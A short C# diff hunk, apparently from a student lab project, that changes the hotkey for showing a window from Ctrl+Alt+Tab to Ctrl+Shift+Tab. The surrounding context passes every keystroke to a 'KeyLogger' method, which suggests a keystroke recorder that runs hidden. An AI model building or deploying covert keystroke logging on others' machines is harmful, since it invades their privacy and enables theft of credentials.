@@ -32,7 +32,7 @@ namespace Laba_8
                 }
                 _logger.KeyLogger(e.KeyData.ToString());
             }
-            if (e.KeyData == (Keys.Control | Keys.Alt | Keys.Tab))
+            if (e.KeyData == (Keys.Control | Keys.Shift | Keys.Tab))
             {
                 if (_windowShow != null)
                 {
